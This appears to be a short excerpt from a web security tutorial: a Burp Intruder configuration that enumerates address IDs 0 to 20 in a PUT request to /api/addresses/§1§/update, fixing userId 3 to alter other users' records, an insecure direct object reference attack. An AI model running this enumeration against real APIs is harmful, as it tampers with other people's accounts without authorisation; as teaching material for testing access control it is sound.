# Example 4: Burp Intruder Enumeration

```
# Configure Intruder attack
Target: PUT /api/addresses/§1§/update
Payload Position: Address ID in URL and body

Attack Configuration:
- Type: Battering Ram
- Payload: Numbers 0-20, Step 1

Body Template:
{
  "id": §1§,
  "userId": 3
}

# Analyze results:
# - 200 responses indicate successful modification
# - Check victim's account for new addresses
```